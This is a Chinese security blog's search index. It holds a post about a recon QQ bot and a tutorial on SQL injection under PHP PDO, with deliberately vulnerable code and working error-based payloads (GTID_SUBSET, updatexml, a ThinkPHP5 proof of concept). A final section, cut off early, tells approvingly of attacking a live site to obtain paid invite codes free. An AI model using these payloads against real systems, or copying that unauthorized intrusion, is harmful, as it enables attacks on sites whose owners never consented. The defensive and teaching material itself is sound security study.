<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>实现资产搜集QQ机器人</title>
      <link href="/2023/04/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
      <url>/2023/04/19/%E5%AE%9E%E7%8E%B0%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001命令及功能演示"><a href="#0x001命令及功能演示" class="headerlink" title="0x001命令及功能演示#"></a>0x001命令及功能演示<a href="https://www.secquan.org/Share/1070486#0x001%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA">#</a></h2><p>之前为一个论坛写了个文章机器人，最近加上了子域名查询和资产搜集功能（用的自己的付费接口）</p><p>加上这两个功能希望可以方便大家渗透测试和学习使用</p><p>原本希望写一个QQ渗透机器人编写系列的。。但是介于比较合规性上比较敏感和最近缺乏时间，日后再动工</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191657535.png" alt="image-20230419165737517"></p><p>本机器人QQ号为3609079527，申请添加好友后，机器人自动同意，自动同意加群</p><p>欢迎各位群主&#x2F;群管&#x2F;安全爱好者拉入群中使用（只回复群里）</p><p>拉入群中后，输入命令“帮助”即可查看使用方法<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658516.png" alt="image-20230419165849492"></p><p>目前支持的命令有</p><p>最新文章</p><p>最热文章</p><p>搜索 xxx</p><p>资产查询 xxx</p><p>子域名查询 xxx</p><h2 id="0x002演示"><a href="#0x002演示" class="headerlink" title="0x002演示#"></a>0x002演示<a href="https://www.secquan.org/Share/1070486#0x002%E6%BC%94%E7%A4%BA">#</a></h2><h3 id="资产查询"><a href="#资产查询" class="headerlink" title="资产查询#"></a>资产查询<a href="https://www.secquan.org/Share/1070486#%E8%B5%84%E4%BA%A7%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658590.png" alt="image-20230419165759873"></p><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询#"></a>子域名查询<a href="https://www.secquan.org/Share/1070486#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2">#</a></h3><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191658767.png" alt="image-20230419165817747"></p><p>其他功能在此不过多演示，请各位自行体验</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/04/19/hello-world/"/>
      <url>/2023/04/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Blog迁移到Github纪念日</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>从PDO下的注入思路到获得Git 3000star项目0day</title>
      <link href="/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/"/>
      <url>/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PDO简介"><a href="#0x01-PDO简介" class="headerlink" title="0x01 PDO简介"></a>0x01 PDO简介</h2><p>PDO全名PHP Data Object</p><p>PDO扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以使用相同的函数（方法）来查询和获取数据。</p><p>PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO），列表性比较如下：</p><table><thead><tr><th></th><th>Mysqli</th><th>PDO</th><th>MySQL</th></tr></thead><tbody><tr><td>引入的PHP版本</td><td>5.0</td><td>5.0</td><td>3.0之前</td></tr><tr><td>PHP5.x是否包含</td><td>是</td><td>是</td><td>是</td></tr><tr><td>服务端prepare语句的支持情况</td><td>是</td><td>是</td><td>否</td></tr><tr><td>客户端prepare语句的支持情况</td><td>否</td><td>是</td><td>否</td></tr><tr><td>存储过程支持情况</td><td>是</td><td>是</td><td>否</td></tr><tr><td>多语句执行支持情况</td><td>是</td><td>大多数</td><td>否</td></tr></tbody></table><p>如需在php中使用pdo扩展，需要在php.ini文件中进行配置</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640774.png" alt="image"></p><h2 id="0x02-PDO防范SQL注入"><a href="#0x02-PDO防范SQL注入" class="headerlink" title="0x02 PDO防范SQL注入"></a>0x02 PDO防范SQL注入</h2><h3 id="①调用方法转义特殊字符"><a href="#①调用方法转义特殊字符" class="headerlink" title="①调用方法转义特殊字符"></a>①调用方法转义特殊字符</h3><p><strong>quote()方法(这种方法的原理跟addslashes差不多，都是转义)</strong></p><p>PDO类库的quate()方法会将输入字符串（如果需要）周围加上引号，并在输入字符串内转义特殊字符。</p><p>EG①:</p><pre><code class="PHP">&lt;?php$conn = new PDO(&#39;sqlite:/home/lynn/music.sql3&#39;);/* Dangerous string */$string = &#39;Naughty &#39; string&#39;;print &quot;Unquoted string: $stringn&quot;;print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;n&quot;;?&gt;</code></pre><p>输出</p><pre><code class="php">Unquoted string: Naughty &#39; stringQuoted string: &#39;Naughty &#39;&#39; string&#39;</code></pre><p>EG②</p><p>test.sql</p><pre><code>SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for user-- ----------------------------DROP TABLE IF EXISTS `user`;CREATE TABLE `user`  (  `id` int(10) NOT NULL,  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of user-- ----------------------------INSERT INTO `user` VALUES (0, &#39;admin&#39;, &#39;admin&#39;);INSERT INTO `user` VALUES (1, &#39;user&#39;, &#39;user&#39;);SET FOREIGN_KEY_CHECKS = 1;</code></pre><p>pdo.php</p><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);     $username=$pdo-&gt;quote($username);     $password=$pdo-&gt;quote($password);    $sql=&quot;select * from user where username=&#123;$username&#125; and password=&#123;$password&#125;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>访问<a href="http://localhost/pdo.php?username=admin&password=admin">http://localhost/pdo.php?username=admin&amp;password=admin</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640915.png" alt="image"></p><p>当我们使用单引号探测注入时</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640974.png" alt="image"></p><p>如图，单引号已被反斜线转义</p><h3 id="②预编译语句"><a href="#②预编译语句" class="headerlink" title="②预编译语句"></a>②<strong>预编译语句</strong></h3><p><strong>1、占位符-通过命名参数防止注入</strong></p><p>通过命名参数防止注入的方法会使得程序在执行SQL语句时，将会把参数值当成一个字符串整体来进行处理，即使参数值中包含单引号，也会把单引号当成单引号字符，而不是字符串的起止符。这样就在某种程度上消除了SQL注入攻击的条件。</p><p>将原来的SQL查询语句改为</p><pre><code>Select * from where name=:username and password=:password</code></pre><p>prepare方法进行SQL语句预编译</p><p>最后通过调用rowCount()方法，查看返回受sql语句影响的行数</p><p>返回0语句执行失败，大于等于1，则表示语句执行成功。</p><p>All code</p><pre><code>&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array(&quot;:username&quot;=&gt;$username,&quot;:password&quot;=&gt;$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>2、占位符-通过问号占位符防止注入</strong></p><p>把SQL语句再进行修改</p><pre><code class="sql">select * from user where name=? and password=?</code></pre><p>同上，prepare方法进行SQL语句预编译</p><p>最后调用rowCount()方法，查看返回受sql语句影响的行数</p><pre><code class="php">&lt;?header(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=? and password=?&quot;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array($username,$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>效果同上</p><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>3.通过bindParam()方法绑定参数防御SQL注入</strong></p><p>修改语句部分</p><pre><code class="php">$sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);</code></pre><p><strong>解释：</strong><br>a)：:username 和 :password为命名参数<br>b)：$username;$password为获取的变量，即用户名和密码。<br>c)：PDO::PARAM_STR,表示参数变量的值一定要为字符串，即绑定参数类型为字符串。在bindparam()方法中，默认绑定的参数类型就是字符串。</p><p>​       当你要接受int型数据的时候可以绑定参数为PDO::PARAM_INT.</p><pre><code class="php">&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GETT[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);    $stmt-&gt;execute();    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>效果同上</p><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p>这只是总结了一部分PDO防范SQL注入的方法，仍有方法请见下文</p><p>其他手法还有很多，大家感兴趣的话可以自行研究</p><h2 id="0x03-PDO下的注入手法与思考"><a href="#0x03-PDO下的注入手法与思考" class="headerlink" title="0x03 PDO下的注入手法与思考"></a>0x03 PDO下的注入手法与思考</h2><p>读完前文后，读者们可能不由感叹，真狠啊，什么都tmd转义，什么语句都预编译了，这我tmd注入个毛…</p><p><img src="https://i.loli.net/2021/05/25/k3VIpq2GndYDKhg.png" alt="image-20210525143226397"></p><p><img src="https://i.loli.net/2021/05/25/mgUREqoKWj2Lc1O.jpg" alt="img"></p><p>北宋宰相王安石有言“看似寻常最奇崛,成如容易却艰辛”</p><p>让我们抽丝剥茧来探寻PDO下的注入手法</p><p>目前在PDO下，比较通用的手法主要有如下两种</p><h3 id="①宽字节注入"><a href="#①宽字节注入" class="headerlink" title="①宽字节注入"></a><strong>①宽字节注入</strong></h3><p>注入的原理就不讲了，相信大家都知道</p><p>一张图，清晰明了</p><p><img src="https://i.loli.net/2021/05/25/Vl2qxBSFykeNp5h.png" alt="image-20210525144401689"></p><p>当Mysql数据库my.ini文件中设置编码为gbk时，</p><p>我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql_real_escape_string()、mysql_escape_string()等函数、方法，或配置了magic_quotes_gpc&#x3D;on，依然可以通过构造%df’的方法绕过转义</p><h3 id="②堆叠注入与报错注入"><a href="#②堆叠注入与报错注入" class="headerlink" title="②堆叠注入与报错注入"></a>②堆叠注入与报错注入</h3><p>PDO分为<strong>模拟预处理</strong>和<strong>非模拟预处理</strong>。</p><p><strong>模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶</strong></p><p>在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。</p><p>PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p><p><strong>非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：</strong></p><p>第一步是prepare阶段，发送SQL语句模板到数据库服务器；</p><p>第二步通过execute()函数发送占位符参数给数据库服务器执行。</p><p><strong>PDO产生安全问题的主要设置如下：</strong></p><blockquote><p>​    PDO::ATTR_EMULATE_PREPARES    &#x2F;&#x2F;模拟预处理(默认开启)</p><p>​    PDO::ATTR_ERRMODE      &#x2F;&#x2F;报错</p><p>​    PDO::MYSQL_ATTR_MULTI_STATEMENTS      &#x2F;&#x2F;允许多句执行(默认开启)</p></blockquote><p>PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。</p><h4 id="2-1-没有过滤的堆叠注入情况"><a href="#2-1-没有过滤的堆叠注入情况" class="headerlink" title="2.1 没有过滤的堆叠注入情况"></a>2.1 没有过滤的堆叠注入情况</h4><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=&#39;&#123;$username&#125;&#39; and password=&#39;&#123;$password&#125;&#39;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>因为在$pdo&gt;query()执行之前，我们便可以对$sql进行非法操作，那PDO相当于没用</p><p><img src="https://i.loli.net/2021/05/25/iRY4JqCXH3TBZt1.png" alt="image-20210525161109702"></p><p><img src="https://i.loli.net/2021/05/25/zfiamDTkusvMg45.png" alt="image-20210525160856876"></p><p>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</p><pre><code class="php">new PDO($dsn, $user, $pass, array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><p>但是哪怕禁止了多语句执行，也只是防范了堆叠注入而已，直接union即可</p><p><img src="https://i.loli.net/2021/05/25/qMptNExXKOeD27k.png" alt="image-20210525191231332"></p><h4 id="2-2-模拟预处理的情况"><a href="#2-2-模拟预处理的情况" class="headerlink" title="2.2 模拟预处理的情况"></a>2.2 模拟预处理的情况</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    //$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    &#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>$role是可控的，导致可实现堆叠注入和in line query</p><p><img src="https://i.loli.net/2021/05/26/IbQoJZMV3BEW8xa.png" alt="image-20210526015752434"></p><p><img src="https://i.loli.net/2021/05/26/uxRIAn8C9gWVG5B.png" alt="image-20210526005239112"></p><h4 id="2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时"><a href="#2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时" class="headerlink" title="2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时"></a>2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时</h4><p>设置方法</p><pre><code class="php">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code></pre><p>无论是否开启PDO::ATTR_EMULATE_PREPARES-模拟预处理</p><p>此时SQL语句如果产生报错，PDO则会将报错抛出</p><p>除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。</p><p>此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域</p><p>在这种情况下可以实现error-based SQL Injection</p><p>使用GTID_SUBSET函数进行报错注入</p><pre><code class="sql">http://192.168.1.3/pdo.php?role=id OR GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),6700)&amp;username=admin&amp;username=admin</code></pre><p><img src="https://i.loli.net/2021/05/26/1D5nIJ8tQVkAOHU.png" alt="image-20210526013121010"></p><h4 id="2-4-非模拟预处理的情况"><a href="#2-4-非模拟预处理的情况" class="headerlink" title="2.4 非模拟预处理的情况"></a>2.4 非模拟预处理的情况</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);    $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    &#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>此时堆叠注入已经歇逼</p><p><img src="https://i.loli.net/2021/05/26/6AfJC7pE42OZU9I.png" alt="image-20210526015916363"></p><p>但inline query，报错注入依然坚挺可用</p><p><img src="https://i.loli.net/2021/05/26/rNZXVoWfLQed74n.png" alt="image-20210526014840025"></p><h3 id="③一个安全的case"><a href="#③一个安全的case" class="headerlink" title="③一个安全的case"></a>③一个安全的case</h3><p>只要语句内存在有用户非纯字符可控部分，便不够安全；那我们就用非模拟预处理sql写法</p><pre><code class="php">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); </code></pre><p>它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。</p><p>这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p><p>如下为一个安全使用PDO的case</p><pre><code class="php">$pdo = new PDO(&#39;mysql:dbname=testdatabase;host=localhost;charset=utf8&#39;, &#39;root&#39;, &#39;root&#39;);$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM wz_admin WHERE id = :id&#39;);$stmt-&gt;execute(array(&#39;id&#39; =&gt; $id));print_r($stmt -&gt; fetchAll ());exit();</code></pre><blockquote><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符  </p><p>发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，它们是分开传送的，两者独立的，SQL注入攻击者没有一点机会</p></blockquote><h2 id="0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅"><a href="#0x04-案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入-来自Phithon师傅" class="headerlink" title="0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)"></a>0x04 案例剖析-ThinkPHP5中PDO导致的一个鸡肋注入(来自Phithon师傅)</h2><p>我们来看Phithon师傅几年前博客发的一个case</p><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p><pre><code class="php">&lt;?phpnamespace app\index\controller;use app\index\model\User;class Index&#123;    public function index()    &#123;        $ids = input(&#39;ids/a&#39;);        $t = new User();        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();    &#125;&#125;</code></pre><p>如上述代码，如果我们控制了in语句的值位置，即可通过传入一个数组，来造成SQL注入漏洞。</p><p>文中已有分析，我就不多说了，但说一下为什么这是一个SQL注入漏洞。IN操作代码如下：</p><pre><code class="php">&lt;?php...$bindName = $bindName ?: &#39;where_&#39; . str_replace([&#39;.&#39;, &#39;-&#39;], &#39;_&#39;, $field);if (preg_match(&#39;/\W/&#39;, $bindName)) &#123;    // 处理带非单词字符的字段名    $bindName = md5($bindName);&#125;...&#125; elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) &#123;    // IN 查询    if ($value instanceof \Closure) &#123;        $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);    &#125; else &#123;        $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);        if (array_key_exists($field, $binds)) &#123;            $bind  = [];            $array = [];            foreach ($value as $k =&gt; $v) &#123;                if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) &#123;                    $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;                &#125; else &#123;                    $bindKey = $bindName . &#39;_in_&#39; . $k;                &#125;                $bind[$bindKey] = [$v, $bindType];                $array[]        = &#39;:&#39; . $bindKey;            &#125;            $this-&gt;query-&gt;bind($bind);            $zone = implode(&#39;,&#39;, $array);        &#125; else &#123;            $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));        &#125;        $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;    &#125;</code></pre><p>可见，<code>$bindName</code>在前边进行了一次检测，正常来说是不会出现漏洞的。但如果<code>$value</code>是一个数组的情况下，这里会遍历<code>$value</code>，并将<code>$k</code>拼接进<code>$bindName</code>。</p><p>也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？</p><p>这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：</p><ol><li><code>prepare($SQL)</code> 编译SQL语句</li><li><code>bindValue($param, $value)</code> 将value绑定到param的位置上</li><li><code>execute()</code> 执行</li></ol><p>这个漏洞实际上就是控制了第二步的<code>$param</code>变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.cccfdc6225bf.png" alt="sp170704_025805.png"></a></p><p>所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。</p><p>但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：</p><pre><code class="PHP">&lt;?php$params = [    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];$db = new PDO(&#39;mysql:dbname=cat;host=127.0.0.1;&#39;, &#39;root&#39;, &#39;root&#39;, $params);try &#123;    $link = $db-&gt;prepare(&#39;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#39;);&#125; catch (\PDOException $e) &#123;    var_dump($e);&#125;</code></pre><p>执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.f4586aaea04f.png" alt="sp170704_032524.png"></a></p><p>究其原因，是因为我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。</p><p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后<code>execute()</code>的时候才发送给数据库执行；如果我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>这时，假设在第一步执行<code>prepare($SQL)</code>的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：</p><pre><code class="php">...// PDO连接参数protected $params = [    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,    PDO::ATTR_EMULATE_PREPARES  =&gt; false,];...</code></pre><p>可见，这里的确设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：</p><p><a href="http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231">http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231</a></p><p><a href="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.679dfef54084.png" alt="sp170704_021313.png"></a></p><p>但是，如果你将user()改成一个子查询语句，那么结果又会爆出<code>Invalid parameter number: parameter was not defined</code>的错误。</p><p>因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。</p><h2 id="0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day"><a href="#0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day" class="headerlink" title="0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day"></a>0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day</h2><h4 id="5-1-起因"><a href="#5-1-起因" class="headerlink" title="5.1 起因"></a>5.1 起因</h4><p>挖SRC，做项目做的心生烦闷，前几日忍不住在家看1024(cl)社区，越看越来劲，邪火攻心，想搜片看</p><p>奈何cl社区一向奉行邀请制，邀请码又很难搞到，可谓让人十分不爽</p><p>于是本人去google上找了一个卖1024社区邀请码的站</p><p><img src="https://i.loli.net/2021/05/26/s43NVSmyUhGxlP2.png" alt="image-20210526023044553"></p><p>88块钱….虽然不算贵，但售卖这种东西本来就是不受法律保护的。作为一个JB小子，怎么可能不动点白嫖心思？</p><p>在黑盒测试了一段时间后，发现支付逻辑和前台都没什么安全问题。。难道我真的要花钱买这激活码？？？？</p><p>不可能，绝对不可能。</p><p>看到网站底部有一个Powered by xxx，呵呵呵，好家伙，不出意外这应该就是这个站用的CMS系统了</p><p><img src="https://i.loli.net/2021/05/26/WT9bnVZrH5J1dKu.png" alt="image-20210526023227963"></p><p>去Git上一搜，还真有，2000多个Star，作者维护了好几年，也算是个成熟的项目了。</p><p>直接把最新版源码下载下来，丢进PHPstorm里开始审计</p><h4 id="5-2-从审计思路到PDO导致的前台XFF堆叠注入"><a href="#5-2-从审计思路到PDO导致的前台XFF堆叠注入" class="headerlink" title="5.2 从审计思路到PDO导致的前台XFF堆叠注入"></a>5.2 